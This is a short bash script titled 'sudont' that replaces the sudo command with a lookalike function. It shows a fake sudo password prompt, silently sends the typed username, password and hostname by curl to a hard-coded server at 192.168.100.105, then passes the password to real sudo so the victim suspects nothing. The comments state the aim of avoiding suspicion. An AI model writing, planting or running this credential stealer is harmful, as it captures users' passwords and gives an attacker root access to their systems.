# sudont by Chris Figura
sudo() {
    # Check if sudo is cached, if so, just run the command to not be suspicious.
    if ! /usr/bin/sudo -vn >/dev/null 2>/dev/null; then
        # Fake sudo prompt
        user=`whoami`
        echo -n "[sudo] password for $user: "
        read -s password
        echo

        # Upload credentials to sudont-server
	host=`uname -n`
        curl -X POST -H "Content-Type: application/json" -d "{\"user\": \"$user\", \"password\": \"$password\", \"host\": \"$host\"}" http://192.168.100.105:32618/credentials >/dev/null 2>/dev/null

        # Send the password to sudo so the timeout is active
        echo $password | /usr/bin/sudo -S true >/dev/null 2>/dev/null
    fi

    # Run the command with real sudo
    /usr/bin/sudo $@
}
